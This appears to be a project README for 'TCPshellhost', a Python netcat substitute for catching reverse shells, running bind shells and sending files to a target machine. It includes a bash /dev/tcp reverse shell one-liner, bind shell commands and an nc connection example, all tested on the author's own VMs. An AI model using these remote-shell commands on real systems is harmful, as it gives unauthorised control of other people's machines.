# TCPshellhost

This project came about while I was working on a machine without netcat, wget, basically anything useful. I then set about creating a server that would give the functionality of the aforementioned. Namely I was interested in getting reverse shells, bind shells, and transferring files to the machine. I was successful in my endeavors and would like to share the results.

# Usage
## Reverse Shell
The original purpose was simply a listening server to catch reverse shells, so this functionality is the simplest

  ```powershell
  #create a listener on 0.0.0.0 port 1234
  $ python3 TCPshellhost.py -p 1234
  ```
  
Of course this merely listens, the target machine must also get involved:

  ```powershell
  #here we can send stdin/out to 127.0.0.1 which must be listening on port 1234
  $ bash -i >& /dev/tcp/127.0.0.1/1234 0>&1
  ```
Once the shell is established the host machine can issue commands in the target shell's language.
An added feature I created is sending files to the target machine:

  ```powershell
  [+] Listening on <0.0.0.0:4444>
  [+] Got connection form <192.168.1.20:38780>
  #now we are free to download files on 192.168.1.20 from host
  root@payload$ download /path/to/file ./CopyOfFile
  ```
 The download feature reads the file bitwise and transfers hex to the target machine which is then written to file using "echo -n -e"
 
 ## Bind Shell
The last feature to be added was the ability to create a bind shell. Obviously in this instance the target machine must run the script. If this is the only purpose for the script one can in fact gut most of the code (all of the Shell class, all but the listener and bind_recieve function in the Socket class can be removed).
On the target machine run:

```powershell
$ python3 TCPshellhost.py -p 4444 -b
```
This will begin listening, waiting on commands to be entered, stdout will then by sent back. We can issue commands from another machine with TCPshellhost as follows:

```powershell
#the machine listening is assumed to have the ip form earlier
$ python3 TCPshellhost.py -p 4444 -H 192.168.1.20 -c
pwd
/home/user
```
One doesn't have to use TCPshellhost to send commands, any shell host should agree with the interface. For instance we should see the same results with:
```powershell
$ nc 192.168.1.20 4444
pwd
/home/user
```

# Testing
This script was developed on Ubuntu 20.04. The majority of the connections tested were between this machine and VMs running Arch and Debian. NetBSD and OpenBSD have been seen to work as well as a single reverse shell obtained on an instance of Windows Server 2008 R2.
